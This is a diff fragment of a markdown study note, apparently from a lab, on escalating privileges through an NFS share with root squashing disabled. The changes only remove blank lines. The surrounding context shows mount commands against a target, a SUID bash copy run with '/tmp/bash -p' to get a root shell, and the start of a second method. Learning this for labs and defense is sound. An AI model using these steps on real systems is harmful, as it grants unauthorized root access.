@@ -1,4 +1,3 @@
-
 Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
 
 Check the NFS share configuration on the Debian VM:
@@ -18,7 +17,6 @@ mount -o rw,vers=3 <target ip>:/tmp /tmp/nfs
 #or
 mount -w nfs <target ip>:/tmp /tmp/nfs
 ```
-
 # Exploitation
 
 ### Method 1
@@ -52,7 +50,6 @@ Now we go back to the target machine and run the file to gain a root shell:
 ```bash
 /tmp/bash -p
 ```
-
 ### Method 2
 
 On the target machine we use the following command to copy the `/bin/bash` from the target machine to the nfs share:
